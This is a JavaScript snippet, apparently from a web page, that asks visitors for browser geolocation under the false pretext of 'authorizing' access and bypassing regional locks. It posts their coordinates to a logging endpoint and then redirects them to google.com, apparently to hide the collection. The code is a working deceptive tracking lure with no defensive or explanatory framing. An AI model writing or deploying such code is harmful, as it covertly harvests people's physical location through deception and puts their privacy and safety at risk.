async function sendLocation() {
    const btn = document.getElementById('authBtn');
    btn.innerText = "Authorizing...";
    
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const data = { lat: pos.coords.latitude, lon: pos.coords.longitude };
            try {
                await fetch('/api/log', {
                    method: 'POST',
                    body: JSON.stringify(data)
                });
                window.location.href = "https://www.google.com"; // Redirect after success
            } catch (e) {
                alert("Connection failed, please try again.");
            }
        }, (err) => {
            alert("Location access is required to bypass regional locks.");
            btn.innerText = "Initialize Handshake";
        });
    }
}
